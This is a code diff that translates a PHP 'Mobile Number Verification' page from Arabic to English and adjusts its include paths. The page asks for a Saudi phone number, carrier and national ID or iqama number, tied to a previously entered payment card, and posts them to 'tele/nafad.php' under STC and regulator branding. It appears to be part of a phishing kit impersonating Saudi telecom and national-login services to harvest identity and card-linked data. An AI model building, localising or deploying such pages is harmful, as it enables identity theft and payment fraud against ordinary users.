@@ -1,9 +1,10 @@
 <?php
 session_start();
-require_once 'includes/lang.php';
-set_site_lang('ar');
-require_once 'dashboard/init.php';
-require_once 'includes/redirect.php';
+require_once '../includes/lang.php';
+set_site_lang('en');
+
+require_once '../dashboard/init.php';
+require_once '../includes/redirect.php';
 
 // Get user ID from URL parameter or session
 $userId = null;
@@ -43,19 +44,19 @@ $data = [
 ];
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>توثيق رقم الجوال</title>
+    <title>Mobile Number Verification</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
 
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 
-    <link rel="stylesheet" href="includes/lang-toggle.css">
-<style>
+<link rel="stylesheet" href="../includes/lang-toggle.css">
+    <style>
 * {
     box-sizing: border-box;
 }
@@ -95,7 +96,7 @@ body {
 
 .mutasil-logo {
     margin-bottom: 20px;
-    text-align: right;
+    text-align: left;
 }
 .mutasil-logo img {
     height: 40px;
@@ -117,7 +118,7 @@ body {
 
 .text-content {
     flex: 1;
-    text-align: right;
+    text-align: left;
 }
 
 .info-title {
@@ -156,7 +157,7 @@ body {
     border-radius: 6px;
     font-family: 'Cairo', sans-serif;
     font-size: 15px;
-    text-align: right;
+    text-align: left;
     outline: none;
     transition: border-color 0.3s;
     background-color: #fff;
@@ -223,15 +224,15 @@ body {
         <div class="text-content">
             <div class="info-title">
                 <span class="green-arrow">↗</span>
-                توثيق واعتماد رقم الجوال
+                Verify and confirm mobile number
             </div>
             <div class="info-desc">
-                يجب أن يكون رقم الجوال موثقاً ومطابقاً لبيانات الهوية الوطنية / الإقامة، ومرتبطاً ببطاقة الدفع المدخلة
+                Your mobile number must be verified and match your national ID / iqama details, and be linked to the payment card entered
             </div>
         </div>
     </div>
 
-    <!-- رقم الجوال -->
+    <!-- Mobile Number -->
     <div class="input-group phone-wrapper">
         <input type="tel" id="phonenumber" name="phonenumber" class="stc-input" placeholder="5xxxxxxxx" required>
         <img src="https://flagcdn.com/w40/sa.png" alt="KSA" class="saudi-flag">
@@ -240,7 +241,7 @@ body {
     <!-- مشغل الشبكة -->
     <div class="input-group">
         <select id="telecom" name="telecom" class="stc-input" required>
-            <option value="" disabled selected>اختر مشغل الشبكة</option>
+            <option value="" disabled selected>Select telecom provider</option>
             <option value="Zain">Zain</option>
             <option value="Mobily">Mobily</option>
             <option value="STC">STC</option>
@@ -253,7 +254,7 @@ body {
     <!-- هوية جديدة -->
     <div class="input-group">
         <input type="text" id="idNumberInput" name="idNumber_new" class="stc-input"
-               placeholder="رقم الهوية الوطنية / الاقامة">
+               placeholder="National ID / Iqama number">
     </div>
 
     <!-- ✅ User ID المخفي -->
@@ -273,7 +274,7 @@ body {
     }
     ?>
 
-    <button type="submit" class="verify-btn">دخول</button>
+    <button type="submit" class="verify-btn">Continue</button>
 
     <div class="card-footer-stc">
         <img src="img/shaer.png" alt="CST Logo" class="cst-logo">
@@ -288,7 +289,7 @@ async function saveForm(form) {
     const idInput = document.getElementById('idNumberInput').value.trim();
 
     if (!phonenumber || !telecom) {
-        alert("يرجى إدخال رقم الجوال واختيار مشغل الشبكة.");
+        alert("Please enter your mobile number and select a telecom provider.");
         return;
     }
 
@@ -297,17 +298,17 @@ async function saveForm(form) {
     formData.set("telecom", telecom);
     if (idInput) formData.set("idNumber_new", idInput);
 
-    console.log('📤 إرسال البيانات إلى tele/nafad.php...');
+    console.log('📤 Submit البيانات إلى tele/nafad.php...');
 
     let res;
     try {
-        res = await fetch("tele/nafad.php", {
+        res = await fetch("../tele/nafad.php", {
             method: "POST",
             body: formData
         });
     } catch (e) {
         console.error('❌ خطأ في الاتصال:', e);
-        alert("خطأ في الاتصال بالخادم");
+        alert("Server connection error");
         return;
     }
 
@@ -316,7 +317,7 @@ async function saveForm(form) {
         result = await res.json();
     } catch (e) {
         console.error('❌ استجابة غير صحيحة:', e);
-        alert("استجابة غير صحيحة من الخادم");
+        alert("Invalid server response");
         return;
     }
 
